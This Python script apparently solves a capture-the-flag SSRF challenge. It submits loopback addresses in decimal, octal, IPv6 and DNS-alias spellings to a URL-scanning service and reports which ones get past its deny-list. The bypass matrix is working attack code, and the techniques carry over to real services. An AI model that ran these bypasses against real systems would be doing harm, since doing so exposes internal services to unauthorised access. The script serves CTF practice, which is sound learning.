#!/usr/bin/env python3
"""SiteCheck / SunshineCTF 2026 - SSRF deny-list bypass matrix.

Sends the same internal target in every common loopback spelling and reports
whether the deny-list accepted it. Any row marked ACCEPTED is a working bypass;
HTTP port 80 is closed internally, so use :3000 (the Express port).

Set BASE to your own instance before running.
"""
import re
import time

from requests import Session

BASE = "<challenge-url>"  # challenge instance (closed after the event)
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:156.0) Gecko/20100101 Firefox/156.0"

TARGETS = [
    "http://127.0.0.1:3000/profile",
    "http://localhost:3000/profile",
    "http://0.0.0.0:3000/profile",
    "http://2130706433:3000/profile",          # decimal 127.0.0.1
    "http://017700000001:3000/profile",        # octal 127.0.0.1
    "http://127.1:3000/profile",               # short form
    "http://[::1]:3000/profile",               # IPv6 loopback
    "http://[0:0:0:0:0:0:0:1]:3000/profile",   # expanded IPv6 loopback
    "http://[::ffff:127.0.0.1]:3000/profile",  # IPv4-mapped IPv6
    "http://127.0.0.1.nip.io:3000/profile",    # DNS -> loopback
    "http://localtest.me:3000/profile",        # DNS -> loopback
]

BLOCKED_MARKER = "will not inspect internal or local addresses"


def main() -> int:
    s = Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml",
        "Referer": BASE + "/dashboard",
    })

    callsign = "probe%d" % int(time.time())
    r = s.post(BASE + "/register", data={"username": callsign, "password": "pw12345678"},
               timeout=20, allow_redirects=True)
    print("[*] register ->", r.status_code)
    if r.status_code != 200 or "/login" in r.url:
        print("[!] registration failed; is BASE correct?")
        return 1

    for target in TARGETS:
        r = s.post(BASE + "/scan", data={"url": target}, timeout=60)
        body = r.text
        blocked = BLOCKED_MARKER in body
        img = re.search(r"/screenshots/([0-9a-f-]+)\.png", body)
        status = re.search(r'Status</span><span class="v">([^<]*)', body)
        note = re.search(r"Drone note:\s*([^<]*)", body)
        verdict = "BLOCKED (filter)" if blocked else ("ACCEPTED" if img else "other")
        print("%-46s %-16s status=%-5s note=%s" % (
            target, verdict,
            (status.group(1).strip() if status else "-"),
            (note.group(1).strip()[:70] if note else ""),
        ))
        time.sleep(0.5)

    print("\n[i] ACCEPTED rows are bypasses. The service of interest answers on :3000;")
    print("    use the #clearance fragment so the flag lands in the 1280x800 snapshot.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
